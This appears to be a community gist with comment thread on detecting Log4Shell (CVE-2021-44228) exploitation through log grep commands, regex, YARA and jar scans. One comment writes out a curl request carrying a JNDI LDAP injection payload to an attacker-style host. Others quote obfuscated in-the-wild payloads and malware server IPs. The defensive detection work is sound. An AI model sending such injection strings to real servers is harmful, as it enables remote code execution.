# log4j RCE Exploitation Detection

You can use these commands and rules to search for exploitation attempts against log4j RCE vulnerability CVE-2021-44228

## Grep / Zgrep

This command searches for exploitation attempts in uncompressed files in folder `/var/log` and all sub folders

```bash
sudo egrep -I -i -r '\$(\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\n]+' /var/log
```

This command searches for exploitation attempts in compressed files in folder `/var/log` and all sub folders

```bash
sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$(\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\n]+'
```

## Grep / Zgrep - Obfuscated Variants

These commands cover even the obfuscated variants but lack the file name in a match. 

This command searches for exploitation attempts in uncompressed files in folder `/var/log` and all sub folders

```bash
sudo find /var/log/ -type f -exec sh -c "cat {} | sed -e 's/\${lower://'g | tr -d '}' | egrep -I -i 'jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):'" \;
```

This command searches for exploitation attempts in compressed files in folder `/var/log` and all sub folders

```bash
sudo find /var/log/ -name '*.gz' -type f -exec sh -c "zcat {} | sed -e 's/\${lower://'g | tr -d '}' | egrep -i 'jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):'" \;
```

## Log4Shell Detector (Python)

Python based scanner to detect the most obfuscated forms of the exploit codes. 

https://github.com/Neo23x0/log4shell-detector

## Find Vulnerable Software (Windows)

```powershell 
gci 'C:\' -rec -force -include *.jar -ea 0 | foreach {select-string "JndiLookup.class" $_} | select -exp Path
```

by [@CyberRaiju](https://twitter.com/CyberRaiju/status/1469505677580124160)


## YARA

https://github.com/Neo23x0/signature-base/blob/master/yara/expl_log4j_cve_2021_44228.yar

## Help 

Please report findings that are not covered by these detection attempts.

## Credits 

I got help and ideas from 

- [@matthias_kaiser](https://twitter.com/matthias_kaiser) 
- [@daphiel](https://twitter.com/daphiel)
- [@Reelix](https://twitter.com/Reelix)
- @atom-b

++++++++++++++++++++++++++++++
++
++


Network detection: ET posted Suricata (etc) rules in their ET Exploit open ruleset (public, free), via their Twitter
https://twitter.com/ET_Labs/status/1469339963871354884 , look near
tail 6 < https://rules.emergingthreatspro.com/open/suricata-5.0/rules/emerging-exploit.rules

@ktwombley
ktwombley commented 2 days ago • 
These searches will necessarily find failed exploit attempts. Since log4j will replace the ${} token with the output in the log files, if the exploit is successful and doesn't cause an exception or other error, there will not be any output.

These searches will work if applied against something like decoded packet captures; basically before log4j gets ahold of the user-supplied strings.

@mike-bailey
mike-bailey commented 2 days ago • 
@ktwombley I think it's a little more nuanced than that, because you're presumably checking web proxy, application logs etc that exist before log4j in the stack

@ktwombley
ktwombley commented 2 days ago
@mike-bailey for sure!

Most of the discussion I've seen centers around searching one's application logs for these strings to find compromise. I'm trying to get the word out that it won't work.

What you suggest will work. As long as you're also logging data before it hits the application (and log4j) then these yara rules will work.

@sanitybit
sanitybit commented 2 days ago
Some semgrep rules for searching Java source code for vulnerable code paths.

@Azeemering
Azeemering commented 2 days ago
Seeing 45.155.205.233 do the initial scan with an base64 encoded string. When decoded tries to do a curl wget bash etc....to setup a shell.
Stage 2,3 and 4 also seen with final payloads:
nspps/Kingsing malware via following ip's
44[.]240[.]146[.]137
45[.]137[.]155[.]55
185[.]154[.]53[.]140
185[.]191[.]32[.]198

@OllieJC
OllieJC commented 2 days ago
Additional regex: /(\$|\%24)\s*(\{|\%7b)\s*jndi\s*(\:|\%3a)/im

Explanation:
$ or \%24 (%24 == url_encode('$'))
\s* == 0 to many spaces
{ or \%7b (%7b == url_encode('{'))
\s* == 0 to many spaces
"jndi"
\s* == 0 to many spaces
: or \%3a (%3a == url_encode(':'))
/im == case insensitive (in case ${JnDi:... works, including if anyone .lower()s their inputs) and multi-line (likely performance hit, could probably drop the m)

Additional string search of %24%7bjndi:

@Ichimikichiki
Ichimikichiki commented 2 days ago
You're missing a space there at the end of the first Obfuscated Variants cmd

Displayed as
sudo find /var/log/test/ -type f -exec sh -c "cat {} | sed -e 's/\${lower://'g | tr -d '}' | egrep -i 'jndi:(ldap[s]?|rmi|dns):'"\;
Should be
sudo find /var/log/test/ -type f -exec sh -c "cat {} | sed -e 's/\${lower://'g | tr -d '}' | egrep -i 'jndi:(ldap[s]?|rmi|dns):'" \;

@sanitybit
sanitybit commented 2 days ago • 
@Neo23x0 Looking like we may need to look for iiop:// protocol handler as well (unconfirmed).

@bontchev
bontchev commented 2 days ago
@Ichimikichiki, and should be /var/log/ instead of /var/log/test/.

@atom-b
atom-b commented 2 days ago • 
Based on my testing with a basic PoC against a jdk11+ service, and a ysoserial CommonsCollections5 payload, the log output of the victim application following a successful exploitation does not contain ${jdn:...}. In its place is BadAttributeValueException: foo=1.

@Neo23x0
Author
Neo23x0 commented 2 days ago
@atom-b : Does this appear in a successful exploitation attempt or when it failed?

@Neo23x0
Author
Neo23x0 commented 2 days ago
@Ichimikichiki : Thanks. That happened when I copied it from one system into that text box and thought it was a formatting bug.

@atom-b
atom-b commented 2 days ago
@Neo23x0 This happens with a successful exploitation. I've edited my comment to clarify.

@Azeemering
Azeemering commented 2 days ago
Windows Events:

image

@Neo23x0
Author
Neo23x0 commented yesterday
@atom-b : I don't think that the string BadAttributeValueException: is enough to base a detection on. Could you send me a redacted full log line?

@atom-b
atom-b commented yesterday • 
@Neo23x0

Normal request


$ curl  -H '<logged header>: normalheadercontent' http://localhost/some/endpoint/

<timestamp> DEBUG [some.service.package.SomeClass] - <function name> - request <logged header> header with value of normalheadercontent
Successful exploit:

$ curl  -H '<logged header>: ${jndi:ldap://192.168.1.15:1337/e}' http://localhost/some/endpoint/

<timestamp> DEBUG [<some.service.package.SomeClass>] - <function name> - request <logged header> header with value of BadAttributeValueException: foo=1

The foo=1 looks like it's just hardcoded into the CommonsCollections5 gadget chain in ysoserial https://github.com/frohoff/ysoserial/blob/8eb5cbfbf6c47a23682f6186bea9baf6439e57b9/src/main/java/ysoserial/payloads/CommonsCollections5.java#L79

@PlaJoKur
PlaJoKur commented yesterday • 
Technologies affected do not list SAP, is it because sap uses sapjvm and not jdk . Can we have some clarity on sap whether this vulnerability really affects sap. if yes is there a understanding with sap to provide a patch for this

@atom-b
atom-b commented yesterday
I've only tested this against a tomcat target, but I suspect it applies elsewhere: if the initial string injection succeeds but loading the .class fails, an exception with com.sun.jndi and org.apache.logging.log4j.core in the stack trace is thrown. Below is the result of a .class using a gadget chain which doesn't work on the target, i.e. the chain relies on classes that are not on the classpath. The missing BeanComparator class is used in the gadget chain for this particular example.

http-nio-80-exec-13 WARN Error looking up JNDI resource [ldap://192.168.1.15:1337/e]. javax.naming.NamingException [Root exception is java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanComparator]; remaining name 'e'
	at java.naming/com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:531)
	at java.naming/com.sun.jndi.ldap.Obj.decodeObject(Obj.java:237)
	at java.naming/com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1051)
	at java.naming/com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at java.naming/com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:207)
	at java.naming/com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:128)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:55)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:159)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1046)
	...
@knoll-pointer
knoll-pointer commented 22 hours ago
sudo egrep -i -r '${jndi:(ldap[s]?|rmi|dns):/[^\n]+' /var/log

If it comes across /var/log/lastlog (a sparse binary file with no line breaks, which can contain millions of null/zero bytes), then egrep will attempt to load the whole file into memory and cause your server to run out of memory (if you are running it as root/sudo).

I recommend adding -I (capital i) to ignore binary files:
sudo egrep -I -i -r '${jndi:(ldap[s]?|rmi|dns):/[^\n]+' /var/log

@withoutdanger
withoutdanger commented 20 hours ago
@Neo23x0

Good afternoon.
Thanks for your work.

I also saw this format in the Nginx logs:

"GET /$%7Bjndi:ldap://(do_not_use)http443path.kryptoslogic-cve-2021-44228(do_not_use).com/http443path%7D HTTP/1.1"
${jndi:${lower:l}${lower:d}a${lower:p}://(do_not_use)world80.log4j.bin${upper:a}ryedge(do_not_use).io:80/callback}"

(do_not_use) - I added so that you can not go directly to the link
Please update the script.

@lizardlabs
lizardlabs commented 17 hours ago • 
Hi to all,

just wanted to add that Microsoft Logparser command can be used to detect potential log4shell exploits from text based *.log located in c:\logs\ folder and its subfolders (change the parameters as needed):

logparser -i:TEXTLINE -recurse:-1 "select TOP 1000 * FROM 'C:\logs\*.log' WHERE Text like'%$%{%j%n%d%i%:%'"

This is a similar query for Log Parser Lizard (GUI for log parser) but LPL can read compressed logs from .gz and .zip archives:

-- QUERY PROPERTIES: -i:TextLineEx  -ExtendedFileds:ON
select TOP 1000 * 
FROM 
'C:\logs\*.log',
'C:\logs\*.log.gz',
'C:\logs\*.log.zip'
WHERE Text like'%$%{%j%n%d%i%:%'

Log Parser Lizard can read multiline log4j records. For instance with this configuration we are assuming that the log records starts with ISO date format like 2020-10-10 12:22:33 ...etc...):

-- QUERY PROPERTIES: -i:TextLineEx -RecordBeginsWith:202 -EnableAdvancedRecordConfiguration:ON -TextRecordConfiguration.RecordType:MultiLineRecord **-TextRecordConfiguration.RecordHeader.MatchingString:202** -ExtendedFileds:ON

select TOP 1000 * 
FROM 
'C:\logs\*.log',
'C:\logs\*.log.gz',
'C:\logs\*.log.zip'
WHERE Text like'%$%{%j%n%d%i%:%'
Similar query for Event Log Observer to detect log4shell (ELOB uses SQLite syntax for queries so there are more possibilities):

CREATE VIRTUAL TABLE [logs] USING ParsingModule('"C:\logs\*.log","C:\logs\*.log.gz","C:\logs\*.log.zip"', '-i:TextLine');
select * FROM logs
WHERE Text like'%$%{%j%n%d%i%:%'
LIMIT 1000

Event Log Observer can also read multiline records as LPL with these VT parameters

'-i:TextLine -RecordBeginsWith:202 -EnableAdvancedRecordConfiguration:ON -TextRecordConfiguration.RecordType:MultiLineRecord -TextRecordConfiguration.RecordHeader.MatchingString:202 -ExtendedFileds:ON'

Also both Log Parser Lizard and Event Log Observer can read #log4j XML formatted logs and Windows Event Logs, so with similar queries you can search for #log4shell attempts in these too.

Here is the link where you can find these tools https://www.lizard-labs.com (trial version works fine so you can use these queries for free for a while). I've made LPL and ELOB but the point is that these are useful for detecting #log4shell attacks.

The idea for these queries is taken from here: https://github.com/Neo23x0/log4shell-detector

The problem with reading logs is that the JNDI string can be obfuscated in many different ways. These queries are looking for sequence of letters '${jndi:' in that order, not necessary next to each other. They may report some false positives too but you can modify these as you need.

I hope the community will find these useful.

@umitgunduz
umitgunduz commented 17 hours ago
Hi,
If you are looking for Vulnerable Software on Linux, Docker Container, Kubernetes Pods the following command may help you.

find -name "*.jar" -exec sh -c 'unzip -l "{}" | grep -i --color=always JndiLookup.class' ; -print

find -name ".jar" -exec sh -c 'unzip -l "{}" | grep -i --color=always log4j-core-2..jar' ; -print

Best regards.

@chetkhatri
chetkhatri commented 13 hours ago • 
@umitgunduz above commands are giving an error:

find: missing argument to `-exec'
-bash: -print: command not found
@Neo23x0
Author
Neo23x0 commented 12 hours ago
@atom-b : Awesome. This a great help. I'll add these patterns to the YARA rules and the Python-based Log4Shell Detector.

@knightian
knightian commented 10 hours ago • 
@umitgunduz get same error as @chetkhatri, I think that command is for execution inside docker container or somesuch? Doesn't seem to work in native Ubuntu.

@tsilia
tsilia commented 9 hours ago
@Neo23x0
In your command for gzip-compressed logs you use *.gz pattern:
sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$(\{|%7B)jndi:(ldap[s]?|rmi|dns):/[^\n]+'

while in the corresponding command for the obfuscated string search you use *.log.gz pattern:
sudo find /var/log/ -name "*.log.gz" -type f -exec sh -c "zcat {} | sed -e 's/\${lower://'g | tr -d '}' | egrep -i 'jndi:(ldap[s]?|rmi|dns):'" \;

I dunno about other distros, but in modern Ubuntu there's no single file in the /var/log that satisfies the latter pattern, but a bunch of files like xxxxx.log.N.gz.

I edited the second command so that it uses pattern *.gz:
sudo find /var/log/ -name '*.gz' -type f -exec sh -c "zcat {} | sed -e 's/\${lower://'g | tr -d '}' | egrep -i 'jndi:(ldap[s]?|rmi|dns):'" \;
and this fetched me a couple of occurrences which were skipped by the original command that used *.log.gz

Also, if you use * in shell commands it's better to wrap it into ', not ", like this: '*.gz'

@Neo23x0
Author
Neo23x0 commented 8 hours ago
Thanks @tsilia

@orent
orent commented 8 hours ago
Remediation by removing JndiLookup.class is safe for all log4j2 version from 2.0.1 and later. The original 2.0 release (and any betas/prereleases) will be broken if you remove JndiLookup.class

Because log4j2 is so ubiquitous, if is often bundled bundled into other jars rather than placed in its own jar which can be identified by filename. It is therefore a good idea to scan all jars for the presence of JndiLookup.class as suggested by @CyberRaiju above

But because it is frequently bundled, if is also frequently very outdated. I heard reports of people that broke installations of applications that bundled log4j2 2.0 by removing JndiLookup.class.

If your jar also contains JndiCloser.class, it is safe to remove JndiLookup.class. If not, this is version 2.0 and you will need some other method of remediation (environment, property or upgrade)

@tsilia
tsilia commented 6 hours ago
@orent
Hello
Java is not my native programming language, so I wonder what about .war files like this one:
Guacamole client
?
Is this common in Java world to ship applications as .war instead of .jar? Shouldn't detection scripts scan for files with this extension as well?

@orent
orent commented 5 hours ago
@tsilia Absolutely.

.war files, too. They a variation on jar used to store a web application to run in a servlet container.
I understand there is also a .ear extension

@rocketcyberdev
rocketcyberdev commented 5 hours ago
@orent @CyberRaiju

Running the Powershell to check for vulnerable versions returns positive results for both 2.14 and 2.15. Is there some other positive indicators?

Assuming the package is bundled would the bundled jar include the version name in the file as below in my simple test?


C:\>powershell -ExecutionPolicy Bypass -command "gci 'C:\apache-log4j-2.14.0-bin' -rec -force -include *.jar -ea 0 | foreach {select-string JndiLookup.class $_} | select -exp Path"
C:\apache-log4j-2.14.0-bin\log4j-core-2.14.0.jar
C:\apache-log4j-2.14.0-bin\log4j-core-2.14.0.jar

C:\>powershell -ExecutionPolicy Bypass -command "gci 'C:\apache-log4j-2.15.0-bin' -rec -force -include *.jar -ea 0 | foreach {select-string JndiLookup.class $_} | select -exp Path"
C:\apache-log4j-2.15.0-bin\apache-log4j-2.15.0-bin\log4j-core-2.15.0.jar
C:\apache-log4j-2.15.0-bin\apache-log4j-2.15.0-bin\log4j-core-2.15.0.jar

C:\>
@OllieJC
OllieJC commented 2 hours ago
Additional regex to look for recursive/expanding jdni strings:
/(?:\$|\%24)(?:\{|\%7b)[^\w]*?j[^\w]*?n[^\w]*?d[^\w]*?i[^\w]*?(?:\:|\%3a)/i
  
+++++++++++++++++++++++++++++
++
++
